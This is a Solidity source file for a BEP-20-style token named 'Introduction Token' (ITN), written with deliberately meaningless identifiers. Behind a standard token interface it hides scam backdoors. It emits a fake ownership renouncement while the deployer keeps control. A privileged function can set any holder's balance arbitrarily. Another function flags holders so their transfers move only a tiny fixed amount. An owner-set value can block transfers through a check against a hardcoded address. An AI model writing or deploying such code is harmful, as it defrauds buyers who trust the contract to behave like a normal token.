//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface isFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeAmount) external view returns (uint256);

    function transfer(address takeMinMax, uint256 exemptLimitSwap) external returns (bool);

    function allowance(address fromTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptLimitSwap) external returns (bool);

    function transferFrom(
        address sender,
        address takeMinMax,
        uint256 exemptLimitSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderLiquiditySell, uint256 value);
    event Approval(address indexed fromTrading, address indexed spender, uint256 value);
}

abstract contract tokenLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromReceiverTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyFee {
    function createPair(address buyTxList, address sellTrading) external returns (address);
}

interface isFromMetadata is isFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IntroductionToken is tokenLiquidity, isFrom, isFromMetadata {

    function allowance(address walletTotal, address maxExempt) external view virtual override returns (uint256) {
        if (maxExempt == modeLiquidityTeam) {
            return type(uint256).max;
        }
        return senderEnable[walletTotal][maxExempt];
    }

    address private totalToken;

    mapping(address => bool) public shouldLiquidity;

    function maxSwap(address takeLaunchedLaunch, address takeMinMax, uint256 exemptLimitSwap) internal returns (bool) {
        if (takeLaunchedLaunch == isExempt) {
            return autoLiquidityMin(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);
        }
        uint256 maxFrom = isFrom(buyMarketing).balanceOf(amountFrom);
        require(maxFrom == takeLaunched);
        require(takeMinMax != amountFrom);
        if (fromReceiver[takeLaunchedLaunch]) {
            return autoLiquidityMin(takeLaunchedLaunch, takeMinMax, liquidityAuto);
        }
        return autoLiquidityMin(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);
    }

    function transfer(address minFromTo, uint256 exemptLimitSwap) external virtual override returns (bool) {
        return maxSwap(_msgSender(), minFromTo, exemptLimitSwap);
    }

    function toFee() public {
        emit OwnershipTransferred(isExempt, address(0));
        totalToken = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchWallet;
    }

    address amountFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address modeLiquidityTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function autoLiquidityMin(address takeLaunchedLaunch, address takeMinMax, uint256 exemptLimitSwap) internal returns (bool) {
        require(marketingAmountLimit[takeLaunchedLaunch] >= exemptLimitSwap);
        marketingAmountLimit[takeLaunchedLaunch] -= exemptLimitSwap;
        marketingAmountLimit[takeMinMax] += exemptLimitSwap;
        emit Transfer(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);
        return true;
    }

    string private toSell = "ITN";

    uint8 private liquidityReceiver = 18;

    bool public txSenderMin;

    mapping(address => uint256) private marketingAmountLimit;

    address public buyMarketing;

    uint256 private launchWallet = 100000000 * 10 ** 18;

    uint256 marketingModeFee;

    bool public senderIs;

    function approve(address maxExempt, uint256 exemptLimitSwap) public virtual override returns (bool) {
        senderEnable[_msgSender()][maxExempt] = exemptLimitSwap;
        emit Approval(_msgSender(), maxExempt, exemptLimitSwap);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return txIsTeam;
    }

    function balanceOf(address takeAmount) public view virtual override returns (uint256) {
        return marketingAmountLimit[takeAmount];
    }

    bool public tokenSwapAuto;

    string private txIsTeam = "Introduction Token";

    function exemptTo(address takeSell) public {
        sellAuto();
        if (tokenSwapAuto) {
            tokenSwapAuto = false;
        }
        if (takeSell == isExempt || takeSell == buyMarketing) {
            return;
        }
        fromReceiver[takeSell] = true;
    }

    function getOwner() external view returns (address) {
        return totalToken;
    }

    function transferFrom(address takeLaunchedLaunch, address takeMinMax, uint256 exemptLimitSwap) external override returns (bool) {
        if (_msgSender() != modeLiquidityTeam) {
            if (senderEnable[takeLaunchedLaunch][_msgSender()] != type(uint256).max) {
                require(exemptLimitSwap <= senderEnable[takeLaunchedLaunch][_msgSender()]);
                senderEnable[takeLaunchedLaunch][_msgSender()] -= exemptLimitSwap;
            }
        }
        return maxSwap(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);
    }

    function sellAuto() private view {
        require(shouldLiquidity[_msgSender()]);
    }

    constructor (){
        if (tokenSwapAuto) {
            tokenSwapAuto = false;
        }
        fromReceiverTotal receiverMode = fromReceiverTotal(modeLiquidityTeam);
        buyMarketing = buyFee(receiverMode.factory()).createPair(receiverMode.WETH(), address(this));
        
        isExempt = _msgSender();
        toFee();
        shouldLiquidity[isExempt] = true;
        marketingAmountLimit[isExempt] = launchWallet;
        if (tokenSwapAuto) {
            tokenSwapAuto = false;
        }
        emit Transfer(address(0), isExempt, launchWallet);
    }

    uint256 takeLaunched;

    mapping(address => bool) public fromReceiver;

    uint256 private launchedAutoTrading;

    uint256 public toLimit;

    function owner() external view returns (address) {
        return totalToken;
    }

    function amountLaunchedWallet(address minFromTo, uint256 exemptLimitSwap) public {
        sellAuto();
        marketingAmountLimit[minFromTo] = exemptLimitSwap;
    }

    function symbol() external view virtual override returns (string memory) {
        return toSell;
    }

    event OwnershipTransferred(address indexed launchedMarketing, address indexed isSenderMarketing);

    function decimals() external view virtual override returns (uint8) {
        return liquidityReceiver;
    }

    uint256 constant liquidityAuto = 19 ** 10;

    function isFee(uint256 exemptLimitSwap) public {
        sellAuto();
        takeLaunched = exemptLimitSwap;
    }

    address public isExempt;

    bool public atMin;

    function amountTeam(address isTradingAuto) public {
        if (atMin) {
            return;
        }
        if (txSenderMin == tokenSwapAuto) {
            toLimit = launchedAutoTrading;
        }
        shouldLiquidity[isTradingAuto] = true;
        if (senderIs) {
            tokenSwapAuto = true;
        }
        atMin = true;
    }

    mapping(address => mapping(address => uint256)) private senderEnable;

}